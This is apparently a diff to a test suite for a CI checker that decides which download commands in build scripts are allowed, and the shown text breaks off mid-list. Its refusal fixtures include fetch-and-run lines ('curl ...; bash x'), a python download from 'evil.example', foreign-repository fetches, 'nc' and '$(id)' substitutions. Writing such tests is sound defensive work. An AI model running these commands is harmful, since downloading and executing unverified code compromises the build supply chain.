@@ -2064,7 +2064,8 @@ ifck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixt
 refused() { check test "$rc" -eq 1; check test "$(grep -c 'ruled input fetch' "$work/if.out")" -eq "${1:-0}"; }
 HOSTN=packages.example.dev
 LIT='curl -fsS -o "$tmp/i" "https://packages.example.dev/os/${arch}/APKINDEX.tar.gz"'
-KEY='curl -fsS -o "$tmp/k" https://packages.example.dev/key.pub || exit 1'
+# FLIPPED fixture (AC19'' scope cut, post-9): was 'curl -fsS -o "$tmp/k" https://packages.example.dev/key.pub || exit 1' (|| is refused now)
+KEY='curl -fsS -o key.pub https://packages.example.dev/key.pub && test -s key.pub'
 FETCH=$'#!/bin/bash\nset -eu\n'
 VERIFY=$'#!/bin/bash\n'"$VL"$'\n'
 TESTT=$'#!/bin/sh\nCASE="a package whose bytes fail verification is removed before use"\n'
@@ -2325,9 +2326,10 @@ CASE="AC19' (6) Codex P2: every line the inventory recognises as a download is c
 check python3 - "$chk" <<'PYC1'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'r = subprocess.run(["curl", "-fsS", "-o", p, "https://h.example.dev/a"], stdout=sys.stderr)', 'if curl -fsS -o x https://h.example.dev/a; then ok=1; break; fi',
-         'curl -fsS https://h.example.dev/a || exit 1']
-OTHER = ['wget https://h.example.dev/a', 'wget.exe https://h.example.dev/a', '/usr/bin/wget https://h.example.dev/a', '/usr/bin/curl -fsS https://h.example.dev/a', 'curl.exe -fsS https://h.example.dev/a',
+PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'r = subprocess.run(["curl", "-fsS", "-o", p, "https://h.example.dev/a"], stdout=sys.stderr)',
+         'curl -fsS https://h.example.dev/a && test -s x']
+OTHER = ['if curl -fsS -o x https://h.example.dev/a; then ok=1; break; fi', 'curl -fsS https://h.example.dev/a || exit 1',   # FLIPPED (PLAIN before) by the AC19'' scope cut
+         'wget https://h.example.dev/a', 'wget.exe https://h.example.dev/a', '/usr/bin/wget https://h.example.dev/a', '/usr/bin/curl -fsS https://h.example.dev/a', 'curl.exe -fsS https://h.example.dev/a',
          'curl-impersonate -fsS https://h.example.dev/a', 'x=curl; $x https://h.example.dev/a curl.', 'r = subprocess.run([b"curl", b"-fsS"])', 'r = subprocess.run([b"wget"])',
          "r = subprocess.run(['curl', '-fsS'])", 'r = subprocess.run([CURL, "curl"])', 'curl -fsSL https://h.example.dev/a', 'curl -4fsSL https://h.example.dev/a',
          'curl --location https://h.example.dev/a', 'curl -fsS https://h.example.dev/a; wget https://h.example.dev/b', 'echo wget; curl -fsS https://h.example.dev/a', 'curl "wget" https://h.example.dev/a',
@@ -2380,10 +2382,11 @@ check python3 - "$chk" <<'PYC3'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 U = '"https://h.example.dev/a"'
-PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'if curl -fsS -o x https://h.example.dev/a; then ok=1; fi', 'export X=1; curl -fsS https://h.example.dev/a',
-         'for u in a b; do curl -fsS -o x https://h.example.dev/a; done', 'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/APKINDEX.tar.gz"',
+PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'mkdir -p d; curl -fsS https://h.example.dev/a', 'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/APKINDEX.tar.gz"',
          'r = subprocess.run(["curl", "-fsS", %s], stdout=sys.stderr)' % U]
-OTHER = ['r = subprocess.run(["curl", "-fsS", "-o", "a[0].tgz", %s])' % U,   # FLIPPED by AC19'' (PLAIN before): a bracket in a curl argument
+OTHER = ['if curl -fsS -o x https://h.example.dev/a; then ok=1; fi', 'export X=1; curl -fsS https://h.example.dev/a',   # FLIPPED (PLAIN before) by the AC19''
+         'for u in a b; do curl -fsS -o x https://h.example.dev/a; done',                                              # scope cut: keywords, export
+         'r = subprocess.run(["curl", "-fsS", "-o", "a[0].tgz", %s])' % U,   # FLIPPED by AC19'' (PLAIN before): a bracket in a curl argument
          'r = subprocess.run(["curl", "-fsS", %s],' % U, 'return ["curl", "-fsS", %s]' % U,      # round 4 (fail closed): an unclosed call, a returned,
          'cmd = ["curl", "-fsS", %s]' % U, 'r = run([["curl", "-fsS", %s]])' % U, 'r = run(x, ["curl", "-fsS", %s])' % U,   # assigned or nested list
          'r = subprocess.run([TOOLS[["curl"][0]], %s])' % U,                     # the reproducer
@@ -2458,11 +2461,12 @@ check python3 - "$chk" <<'PYC5'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 U = '"https://h.example.dev/a"'
-PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'curl -fsS https://h.example.dev/a; echo done', 'curl -fsS https://h.example.dev/a || exit 1',
+PLAIN = ['curl -fsS -o x https://h.example.dev/a', 'curl -fsS https://h.example.dev/a; echo done', 'curl -fsS https://h.example.dev/a && test -s a',
          'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/a"', 'curl -fsS --output "$out" https://h.example.dev/a && echo ok',
          "curl -fsS -o 'a b' https://h.example.dev/a", 'r = subprocess.run(["curl", "-fsS", "-o", part, %s], stdout=sys.stderr)' % U,
          'subprocess.check_call(["curl", "--fail", %s])' % U, 'r = subprocess.run(["curl", "-fsS", %s], check=True, timeout=30)' % U]
 OTHER = ['out = subprocess.check_output(["curl", "-fsS", %s]).decode()' % U,   # FLIPPED by AC19'' (PLAIN before): the whole line, nothing after the call
+         'curl -fsS https://h.example.dev/a || exit 1',                                  # FLIPPED (PLAIN before) by the AC19'' scope cut: || is refused
 'r = subprocess.run(["curl", %s]' % U, 'r = subprocess.run(["curl", %s],' % U, 'r = subprocess.run(["curl", %s], stdout=x,' % U,   # A1
          'return (["curl", %s],)[0]' % U, 'if (["curl"],)[0]: run(T[0], %s)' % U, 'x = not (["curl", %s],)[0]' % U,                         # B2
          'r = subprocess.run(x, ["curl", %s])' % U, 'cmd.extend(["curl", %s])' % U, 'r = subprocess.run(["curl", %s], executable=E)' % U,
@@ -2561,7 +2565,7 @@ ifrepo ifp0k "${SUPPORT[@]}" head bin/fetch.sh "$FETCH"'curl -fsSLO "https://pac
 ifx "$work/if-1.json" plain "$(ifrow "$work/ifp0k" bin/fetch.sh 'curl -fsSLO "https://packages.example.dev/os/i"' "$HOSTN" "{\"verifier\": {\"file\": \"bin/verify.sh\", \"line\": $(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$COS")}}")"; ifck ifp0k "$work/if-1.json"
 CASE="AC19'' (0) control: curl -fsSLO (listed, follows redirects) with a cosign verifier line passes: exit 0"
 check test "$rc" -eq 0
-for L in "curl --fail --silent --show-error --retry 3 --max-time 30 --output \"\$tmp/i\" $U0" "curl -fsS -o i $U0 && sha256sum -c i.sha256" "curl -fsS -o f $U0; bash f"; do
+for L in "curl --fail --silent --show-error --retry 3 --max-time 30 --output \"\$tmp/i\" $U0" "curl -fsS -o i $U0 && sha256sum -c i.sha256" "curl -fsS -o f $U0; test -s f"; do
   one ifp0p "$FETCH$L"$'\n' "$L"
   CASE="AC19'' (0) control: $L (every word plain) with a checksum verifier line passes: exit 0"
   check test "$rc" -eq 0
@@ -2595,9 +2599,8 @@ import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 U = '"https://h.example.dev/a"'
 LISTED = ['curl -fsS -o x https://h.example.dev/a', 'curl -fsSL -o x https://h.example.dev/a', 'curl -fsSLO https://h.example.dev/a', 'curl -O https://h.example.dev/a',
-          'curl --fail --silent --show-error --location --retry 3 --max-time 30 --output x https://h.example.dev/a', 'curl -fsS -o x https://h.example.dev/a; bash x',
-          'if curl -fsS -o x https://h.example.dev/a; then ok=1; break; fi', 'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/a"', 'curl -fsS https://h.example.dev/a || exit 1',
-          "curl -fsS -o 'a b' https://h.example.dev/a", 'curl -fsS https://h.example.dev/a;', 'for u in a b; do curl -fsS -o x https://h.example.dev/a; done',
+          'curl --fail --silent --show-error --location --retry 3 --max-time 30 --output x https://h.example.dev/a', 'curl -fsS -o x https://h.example.dev/a; test -s x',
+          'curl -fsS -o "$tmp/i" "https://h.example.dev/os/${arch}/a"', "curl -fsS -o 'a b' https://h.example.dev/a",
           'r = subprocess.run(["curl", "-fsSL", "-o", part, %s], stdout=sys.stderr)' % U, 'subprocess.check_call(["curl", "--fail", %s])' % U,
           'r = subprocess.run(["curl", "--retry", "3", %s], check=True)' % U, 'r = subprocess.run([ "curl" , "-fsS", %s])' % U,
           # Codex round 6 B P3: N digits, any number of them (the notes set no limit); an optional ONE-letter r, b or u prefix; a name as FILE
@@ -2608,6 +2611,9 @@ LISTED = ['curl -fsS -o x https://h.example.dev/a', 'curl -fsSL -o x https://h.e
           'r = subprocess.run(["curl", "-fsS", u"https://h.example.dev/a"])', 'r = subprocess.run(["curl", "-o", part_2, %s])' % U,
           'r = subprocess.run(["curl", "--output", out, %s])' % U]
 UNLISTED = ['curl -fsS ~ https://h.example.dev/a', 'curl -fsS -o ~/x https://h.example.dev/a', 'curl -fsS https://h.example.dev/a; echo ~', 'curl -fsS https://h.example.dev/~a',
+            # FLIPPED (LISTED before) by the AC19'' scope cut (post-9): a later command off the local list, a keyword, ||, a joiner at the end of the line
+            'curl -fsS -o x https://h.example.dev/a; bash x', 'if curl -fsS -o x https://h.example.dev/a; then ok=1; break; fi', 'curl -fsS https://h.example.dev/a || exit 1',
+            'curl -fsS https://h.example.dev/a;', 'for u in a b; do curl -fsS -o x https://h.example.dev/a; done',
             'curl -fsS -o x https://h.example.dev/a; bash $x', 'curl -fsS -o x https://h.example.dev/a; bash "$x"', 'curl -fsS -o x https://h.example.dev/a && echo $HOME', 'curl -fsS -o x https://h.example.dev/a; echo `id`',
             'curl -fsS "https://h.example.dev/{a,b}"', "curl -fsS 'https://h.example.dev/[1-2]'", 'curl -fsS -o x https://h.example.dev/a; [ -s x ]',
             'curl -fsS -o x https://h.example.dev/a && { echo; }', 'curl -fsS https://h.example.dev/a 2>&1', 'curl -fsS https://h.example.dev/a < in',
@@ -2635,8 +2641,9 @@ UNLISTED = ['curl -fsS ~ https://h.example.dev/a', 'curl -fsS -o ~/x https://h.e
 GHD = 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"'
 GH_LISTED = [GHD, GHD + ' -p manifest.json -D dist', GHD + ' --pattern "*.json" --dir dist', GHD + ' -D "$out"', GHD + ' --clobber',
              # controls (round 6): plain later segments with no repository selector and no gh stay listed
-             GHD + ' -p a.json && echo done', GHD + ' -D dist; ls dist', GHD + ' -p a.json || exit 1', GHD + ' -p a.json | tee log', GHD + ' -p a.json; sha256sum -c a.sha256']
-GH_UNLISTED = [GHD + ' -R evil/x', GHD + ' --repo evil/x', GHD + ' --rep evil/x', GHD + ' --r evil/x', GHD + ' --repo=evil/x', GHD + ' -Revil/x', GHD + ' -R=evil/x',
+             GHD + ' -p a.json && echo done', GHD + ' -D dist; ls dist', GHD + ' -p a.json; sha256sum -c a.sha256']
+GH_UNLISTED = [GHD + ' -p a.json || exit 1', GHD + ' -p a.json | tee log',   # FLIPPED (GH_LISTED before) by the AC19'' scope cut: || and | refused, tee too
+               GHD + ' -R evil/x', GHD + ' --repo evil/x', GHD + ' --rep evil/x', GHD + ' --r evil/x', GHD + ' --repo=evil/x', GHD + ' -Revil/x', GHD + ' -R=evil/x',
                GHD + ' -pR x', GHD + '; bash $x', GHD + ' > f', GHD + ' -D ~/d', GHD + ' -p *.json', GHD + ' "-R" x', GHD + 'x', 'gh release download "$tag" --repo "$GITHUB_REPOSITORY"']
 # Codex round 6 (A P1, B P2; OPEN-2): every command segment of the line is held to the list; -R and --repo (any spelling) are refused by name in EVERY
 # segment, and no later segment runs gh (the only listed gh is the prefix: a later gh is not pinned to the repository itself)
@@ -2677,8 +2684,8 @@ plainrefused "    r = subprocess.run([\"curl\", \"-fsS\", \"-o\", None, \"$U0\"]
 plainrefused "curl -fsS $U0 ; git -Cforeign status" 'Codex A7 P2 a glued short option of another command'
 plainrefused "curl -fsS $U0 && tar -xvf x" 'Codex A7 P2 a short option cluster of another command'
 one ifa7 "$FETCH""curl -fsS $U0 ; git -C foreign status"$'\n' "curl -fsS $U0 ; git -C foreign status"
-CASE="AC19'' (0) Codex A7 P2 control: another command's one-letter option and its value (git -C foreign) with a checksum verifier line passes: exit 0"
-check test "$rc" -eq 0
+CASE="AC19'' (0) FLIPPED by the scope cut (was the Codex A7 P2 control, exit 0): a later git -C foreign status with a checksum verifier line: exit 1, not a listed plain form"
+refused 0; check grep -q 'listed plain form' "$work/if.out"
 for L in "curl -fsS $U0,-L" "curl -fsS \"$U0;-L\"" "curl -fsS '$U0?x=-L'" "curl -fsS \"$U0#-L\"" \
          "    r = subprocess.run([\"curl\", \"-fsS\", \"$U0,-L\"], stdout=sys.stderr)" "    r = subprocess.run([\"curl\", \"-fsS\", \"$U0;-L\"], stdout=sys.stderr)"; do
   one ifa7r "$FETCH$L"$'\n' "$L"
@@ -2697,8 +2704,10 @@ check python3 - "$chk" <<'PYC7'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 A = 'curl -fsS https://h.example.dev/a'
-LISTED = [A + ' ; git -C foreign status', A + ' && tar -x -v -f x', A + ' ; make -j 4', A + ' ; sort -o /tmp/x y', A + ' ; ls --all', A + ' ; ls -l']
-UNLISTED = [A + ' ; git -Cforeign status', A + ';git -Cforeign status', A + ' && tar -xvf x', A + ' ; make -j4', A + ' ; sort -o/tmp/x y', A + ' ; ls -1',
+LISTED = [A + ' && tar -x -f x', A + ' ; ls x']
+UNLISTED = [A + ' ; git -C foreign status', A + ' && tar -x -v -f x', A + ' ; make -j 4', A + ' ; sort -o /tmp/x y', A + ' ; ls --all', A + ' ; ls -l',   # FLIPPED (LISTED
+            # before) by the AC19'' scope cut: git, make, sort are not local commands; tar -v, ls --all, ls -l are not listed options
+            A + ' ; git -Cforeign status', A + ';git -Cforeign status', A + ' && tar -xvf x', A + ' ; make -j4', A + ' ; sort -o/tmp/x y', A + ' ; ls -1',
             A + ' ; ls -la', A + ' ; git -C=foreign status', A + ' ; ls --all=x', 'if curl -fsS https://h.example.dev/a; then tar -xzf x; fi']
 GHD = 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"'
 GH_LISTED = [GHD + ' --pattern gh', GHD + ' -p gh', GHD + ' --dir gh', GHD + ' -D gh/out', GHD + ' --pattern "gh"', GHD + " -p 'gh*'", GHD + ' -p gh -D dist',
@@ -2709,7 +2718,7 @@ GH_UNLISTED = [GHD + ' -D dist ; git -C dist status', GHD + ' -Ddist', GHD + ' -
                GHD + ' ; gh api repos/o/r', GHD + ' ; echo --pattern gh', GHD + ' -p gh -R foreign/repo', GHD + ' --pattern gh --repo foreign/repo']
 U = 'https://h.example.dev/a'
 NOREDIRECT = ['curl -fsS %s,-L' % U, 'curl -fsS "%s;-L"' % U, "curl -fsS '%s;-L'" % U, 'curl -fsS "%s?x=-L"' % U, 'curl -fsS "%s#-L"' % U, 'curl -fsS "%s -L"' % U,
-              'curl -fsS %s,--location' % U, 'curl -fsS -o x,-L %s' % U, 'curl -fsS %s ; git -C foreign status' % U,
+              'curl -fsS %s,--location' % U, 'curl -fsS -o x,-L %s' % U, 'curl -fsS %s ; ls x' % U,   # was '; git -C foreign status' (FLIPPED: git refused)
               'r = subprocess.run(["curl", "-fsS", "%s,-L"])' % U, 'r = subprocess.run(["curl", "-fsS", "%s;-L"])' % U, 'r = subprocess.run(["curl", "-fsS", "%s?x=-L"])' % U,
               'r = subprocess.run(["curl", "-fsS", "%s#-L"])' % U, 'r = subprocess.run(["curl", "-fsS", "%s,--config"])' % U, "r = subprocess.run(['curl', '-fsS', '%s,-K'])".replace("'curl'", '"curl"') % U]
 REDIRECT = ['curl -fsSL %s' % U, 'curl -L %s' % U, 'curl --location %s' % U, 'curl -fsS %s ; ls -L' % U, 'curl -fsS %s ; ls --follow' % U,
@@ -2769,33 +2778,31 @@ ghcurlrefused "$G8 ; curl -fsS -o x https://h.example.dev/a"
 ghcurlrefused "$G8 ; git -C foreign fetch https://github.com/foreign/repo"
 L8="curl -fsS $U0 ; git -C foreign fetch https://github.com/foreign/repo"
 one ifa8 "$FETCH$L8"$'\n' "$L8"
-CASE="AC19'' Codex A8 P2: a host line whose later git -C foreign fetch names a foreign repository (ruled for its curl only): exit 1"
-check test "$rc" -eq 1; check grep -q 'git clone or remote fetch' "$work/if.out"
+CASE="AC19'' Codex A8 P2 (scope cut: the inventory's git pattern is main's again): a host line whose later git -C foreign fetch names a foreign repository: exit 1, not a listed plain form"
+check test "$rc" -eq 1; check grep -q 'listed plain form' "$work/if.out"
 plainrefused "    r = subprocess.run([\"curl\", \"-fsS\", \"$U0\"], timeout=1.2.3)" 'Codex A8 P3 a keyword value Python cannot read'
 plainrefused "    r = subprocess.run([\"curl\", \"-fsS\", \"$U0'b\"])" 'Codex B7 P3 a quote of the other kind inside a list string'
 plainrefused "    r = subprocess.run([\"curl\", \"-fso\", out, \"$U0\"])" 'Codex B7 P3 a name after a cluster ending in o'
 L8g="curl -fsS $U0 ; gh api --method \"\$METHOD\" repos/o/r"
 one ifb8 "$FETCH$L8g"$'\n' "$L8g"
-CASE="AC19'' (0) Codex B7 P3: on a host line a double-quoted \$ word as the value of a gh option is listed: exit 0"
-check test "$rc" -eq 0
+CASE="AC19'' (0) FLIPPED by the scope cut (was the Codex B7 P3 control, exit 0): a host line with a later gh: exit 1, not a listed plain form"
+refused 0; check grep -q 'listed plain form' "$work/if.out"
 CASE="AC19'' (0) Codex round 8: git fetches after global options, the repo:self line's later commands, Python plain values and strings, gh option values, unit"
 check python3 - "$chk" <<'PYC8'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
 bad = []
-# A8-1 (a): the inventory names a git fetch, clone, pull, ls-remote, submodule or remote add/set-url whatever global options come before it
+# A8-1 (a) REVERTED by the AC19'' scope cut (post-9; Q1 option S): the inventory's git pattern is origin/main's again (no ruled line can carry a git
+# segment, so the round-8 pattern and its FETCHES/NOFETCH unit are gone); main's pattern names a git clone, submodule update, fetch of an http(s) URL or
+# archive --remote right after git (and its -x options), and NOT git status --short clone or git -C d status -- clone (round 9 A P3: the round-8 pattern did)
 R = 'https://github.com/foreign/repo'
-FETCHES = ['git -C foreign fetch ' + R, 'git -c http.extraHeader=x fetch ' + R, 'git --git-dir=x/.git fetch ' + R, 'git --git-dir x/.git fetch ' + R,
-           'git --work-tree w -C d pull %s main' % R, 'git -C d ls-remote ' + R, 'git -C d clone ' + R, 'git clone ' + R, 'git -C d submodule update --init',
-           'git -C d remote add f ' + R, 'git -C d remote set-url origin ' + R, 'git fetch --depth 1 ' + R, 'git -C d fetch git@github.com:foreign/repo.git',
-           'git --no-pager -C d archive --remote=%s HEAD' % R, 'git fetch -q ssh://git@h.example.dev/r', 'git -C d -c a=b --no-pager fetch --no-tags ' + R,
-           'echo ok; git -C foreign fetch ' + R, 'gh release download "$ver" --repo "$GITHUB_REPOSITORY" ; git -C foreign fetch ' + R]
-NOFETCH = ['git -C d status', 'git -C foreign rev-parse HEAD', 'git -c gpg.format=x509 tag -s v1', 'git log --oneline -1', 'git fetch --no-tags origin main']
+FETCHES = ['git clone ' + R, 'git --no-pager clone ' + R, 'git submodule update --init', 'git fetch ' + R, 'git archive --remote=%s HEAD' % R]
+NOFETCH = ['git status --short clone', 'git -C d status -- clone', 'git log --oneline -1', 'git fetch --no-tags origin main', 'git -C d rev-parse HEAD']
 for ln in FETCHES + NOFETCH:
     f = {"bin/x.sh": "#!/bin/bash\n" + ln + "\n"}
     got = [k for k, _, _ in ac.inv.unmeasured_occurrences(f) if k[1] == "a git clone or remote fetch"]
     if bool(got) != (ln in FETCHES):
-        bad.append(("git fetch named by the inventory", ln, got))
+        bad.append(("git fetch named by main's inventory pattern", ln, got))
 GHD = 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"'
 # A8-1 (b): a repo:self line holds no later git (any subcommand, any wrapper), curl or wget: the prefix is the line's only fetch
 GH_LISTED = [GHD + ' -p a.json && echo done', GHD + ' -p a.json; sha256sum -c a.sha256', GHD + ' -D dist; ls dist']
@@ -2818,10 +2825,11 @@ LISTED = [C + ', timeout=30)', C + ', timeout=1.5)', C + ', timeout=0)', C + ', 
           # B7-3 controls: a NAME after "-o" or "--output" (any listed string prefix)
           'r = subprocess.run(["curl", "-o", out, %s])' % U, 'r = subprocess.run(["curl", "--output", out, %s])' % U, 'r = subprocess.run(["curl", r"-o", out, %s])' % U,
           'r = subprocess.run(["curl", "-fso", "x", %s])' % U,
-          # B7-2: on a host line a double-quoted $ word is the value of a gh option
-          'curl -fsS https://h.example.dev/a ; gh api --method "$METHOD"', 'curl -fsS https://h.example.dev/a ; gh api -X "$METHOD" repos/o/r',
-          'curl -fsS https://h.example.dev/a && gh release view --json "${FIELDS}"']
-UNLISTED = [C + ', timeout=1.2.3)', C + ', timeout=.)', C + ', timeout=1.)', C + ', timeout=.5)', C + ', check=class)', C + ', check=lambda)', C + ', timeout=010)',
+          ]
+UNLISTED = [# B7-2 FLIPPED (LISTED before) by the AC19'' scope cut: gh is not a local command on a host line (b8-3 moot here, a separate follow-up)
+            'curl -fsS https://h.example.dev/a ; gh api --method "$METHOD"', 'curl -fsS https://h.example.dev/a ; gh api -X "$METHOD" repos/o/r',
+            'curl -fsS https://h.example.dev/a && gh release view --json "${FIELDS}"',
+            C + ', timeout=1.2.3)', C + ', timeout=.)', C + ', timeout=1.)', C + ', timeout=.5)', C + ', check=class)', C + ', check=lambda)', C + ', timeout=010)',
             C + ', stdout=sys.)', C + ', stdout=.x)', C + ', stdout=sys..x)', C + ', stdout=x.class)', C + ', stdout=True.x)', C + ', stdout=x.None)', C + ', timeout=1e3)',
             C + ', timeout=-1)', C + ', timeout=1_0)', C + ', check=Ture()', C + ', timeout=30, timeout=31)', C + ', check=True, check=True)', C + ', timeout=)',
             C + ', ,timeout=1)', C + ', timeout=1,,)', C + ', timeout=é)', C + ', timeout=x²)',
@@ -2840,6 +2848,132 @@ for line in LISTED + UNLISTED:
         bad.append(("host", line, why))
 assert not bad, bad
 PYC8
+# --- AC19'' SCOPE CUT (advisor step 5 Oct 11, post-9 scope cut; the advisor's answers Q1 option S and Q2) ----------------------------------------------
+# REQ-SUP-001-AC19 (0): a repo:self line (form (c)) is the gh release download prefix with ONLY its listed options (-p, --pattern, -D, --dir, -O, --output,
+# -A, --archive with a value; --clobber, --skip-existing: gh 2.102.0, the GitHub CLI of the ubuntu-latest runner image), then segments joined only by ;
+# or && that are each ONE local command with its listed options: sha256sum -c FILE; test -f|-s|-e PATH; mv SRC DST; mkdir [-p] DIR; tar -x [-z] -f FILE
+# [-C DIR] or tar -t [-z] -f FILE (long-separated only, FILE holds no :); ls [PATH...]; echo [WORD...]. A host line (form (a)) is the same: segments
+# joined only by ; or &&, each curl (at least one) or one of those local commands. Everything else is refused: every other command, a keyword, || | &,
+# a joiner at the start or the end, a redirection, a substitution, an operand starting with - or $ or holding gh, git, curl or wget.
+# FLIPPED tests (listed before this cut, refused now; each moved and marked FLIPPED where it stands):
+#   the KEY fixture ('... || exit 1' became '... && test -s key.pub'); PYC1 PLAIN 'if curl ...; then ok=1; break; fi', 'curl ... || exit 1';
+#   PYC3 PLAIN 'if curl ...; then ok=1; fi', 'export X=1; curl ...', 'for u in a b; do curl ...; done'; PYC5 PLAIN 'curl ... || exit 1';
+#   the (0) control 'curl -fsS -o f URL; bash f' (now '; test -s f'); PYC6 LISTED 'curl ...; bash x', 'if curl ...; fi', 'curl ... || exit 1',
+#   'curl ...;', 'for u in a b; do curl ...; done'; PYC6 GH_LISTED GHD' -p a.json || exit 1', GHD' -p a.json | tee log'; PYC7 LISTED
+#   '; git -C foreign status', '&& tar -x -v -f x', '; make -j 4', '; sort -o /tmp/x y', '; ls --all', '; ls -l'; PYC7 NOREDIRECT
+#   '; git -C foreign status' (now '; ls x'); the shell control ifa7 (exit 0 -> exit 1); PYC8 LISTED B7-2 '; gh api --method "$METHOD"' and two more;
+#   the shell control ifb8 (exit 0 -> exit 1); ifa8 greps 'listed plain form' (the inventory's git pattern is main's again: PYC8's FETCHES/NOFETCH unit
+#   of the round-8 pattern is replaced by a unit of main's pattern).
+PY9='python3 -c '"'"'import urllib.request; urllib.request.urlretrieve("https://evil.example/x", "a")'"'"
+for L in "$G8 ; $PY9" "$G8 ; ssh h" "$G8 && rsync a b" "$G8 ; tar -x -f h:a.tgz" "$G8 ; tar -x -z -f a.tgz -C out ; git status" "$G8 ; env ls" "$G8 ; xargs echo" \
+         "$G8 ; bash -c ls" "$G8 ; sudo ls" "$G8 ; tar -xzf a.tgz" "$G8 --skip-existing x" "$G8 -X a"; do
+  ghrefused "$L"
+done
+for L in "curl -fsS -o a.tgz $U0 ; $PY9" "curl -fsS -o a.tgz $U0 ; ssh h" "curl -fsS -o a.tgz $U0 && rsync a b" "curl -fsS -o a.tgz $U0 ; tar -x -f h:a.tgz" \
+         "curl -fsS -o a.tgz $U0 ; env ls" "curl -fsS -o a.tgz $U0 || exit 1" "curl -fsS -o a.tgz $U0 ; gh release view"; do
+  plainrefused "$L" 'the scope cut (post-9): a command, joiner or option off the list'
+done
+L9="$G0 -p a.tgz ; sha256sum -c a.tgz.sha256 && mkdir -p out && tar -x -z -f a.tgz -C out && ls out"
+one ifs9 "$FETCH$L9"$'\n' "$L9" repo:self
+CASE="AC19'' (0) scope cut control: the repo:self line $L9 (sha256sum, mkdir, tar, ls) with a checksum verifier line passes: exit 0"
+check test "$rc" -eq 0
+L9h="curl -fsS -o a.tgz $U0 ; sha256sum -c a.tgz.sha256 && mkdir -p out && tar -x -z -f a.tgz -C out && ls out"
+one ifs9h "$FETCH$L9h"$'\n' "$L9h"
+CASE="AC19'' (0) scope cut control: the host line $L9h with a checksum verifier line passes: exit 0"
+check test "$rc" -eq 0
+CASE="AC19'' (0) the scope cut (post-9): only the listed prefix options and local commands after the prefix or curl, joined by ; or &&; neighbour mutants, unit"
+check python3 - "$chk" <<'PYC9'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+GHD = 'gh release download "$ver" --repo "$GITHUB_REPOSITORY"'
+A = 'curl -fsS -o a.tgz https://h.example.dev/a'
+PY = "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"https://evil.example/x\", \"a\")'"
+# R-1 each refused command, as the first later segment and after a listed one, joined by ; and by &&
+CMDS = ['git status', 'git -C foreign fetch https://github.com/foreign/repo', 'wget https://h.example.dev/a', 'gh release view', 'gh api repos/o/r',
+        'python3 -c x', 'python x.py', PY, 'ssh h', 'scp a h:b', 'rsync a b', 'nc h 1', 'env A=b', 'env ls', 'xargs echo', 'command ls', 'exec ls', 'eval x',
+        'bash -c x', 'sh -c x', 'bash x', 'sudo ls', 'cd dist', 'cp a b', 'install a b', 'tee log', 'exit 1', 'true', 'cat a', 'rm a', 'chmod 755 a',
+        'unzip a.zip', 'make -j 4', 'sort -o x y', 'A=b mv a b', '"mv" a b', "'ls'", '/bin/mv a b', './mv a b', '! test -s a', 'time ls', 'if test -s a',
+        'then ls', 'fi', 'done', 'export A=b', 'source x', '. x', 'set -x', 'trap ls EXIT', 'read x', 'printf x', 'sha256', 'tar', 'mkdir', 'mv', 'sha256sum',
+        'test']
+REFUSED = []
+for c in CMDS:
+    for sep in [' ;', ' &&', ';']:
+        REFUSED += [GHD + sep + ' ' + c, GHD + ' -p a.tgz' + sep + ' ls' + sep + ' ' + c, A + sep + ' ' + c, A + sep + ' ls' + sep + ' ' + c, c + sep + ' ' + A]
+REFUSED += [GHD + ' ; curl -fsS https://h.example.dev/a', GHD + ' && curl https://github.com/other/repo/releases/download/v1/a']   # curl is no local command
+# R-2 refused joiners and shapes, after the prefix and after curl
+for X in [GHD + ' -p a', A]:
+    REFUSED += [X + ' || exit 1', X + ' | sha256sum', X + ' & ls', X + ' ;', X + ' &&', X + ' ; ; ls', X + ' ;; ls', X + ' > f', X + ' ; ls > f',
+                X + ' ; echo $(id)', X + ' ; echo `id`', X + ' |& cat', X + ' &> f', X + ' 2>&1', X + ';', X + ' ; ls;', X + ' && && ls', X + ' ;&& ls',
+                X + ' && ls &&', X + ' ; ls ||', X + ' ; ls | cat', X + ' ; { ls; }', X + ' ; (ls)', X + ' ; ls # c', X + ' ; ls ~', X + ' ; ls *.tgz',
+                X + ' ; ls $d', X + ' ; ls a\\b', X + '\n; ls', X + ' ;\tls']
+REFUSED += ['; ' + A, '&& ' + A, '; ' + GHD, GHD + ' -p x;ls', A + ';ls', A + ' ; ls a;ls']   # a ; inside a word is no joiner
+# R-3 each local command with a refused option, operand count or operand
+LOCAL_BAD = ['sha256sum a', 'sha256sum --check a', 'sha256sum -c --ignore-missing a', 'sha256sum -c a b', 'sha256sum -c', 'sha256sum --strict -c a',
+             'sha256sum -c -', 'test -L a', 'test -n a', 'test a = b', 'test -f', 'test -f a b', 'test -d a', 'test -s "$out"', 'test -x a', 'test ! -f a',
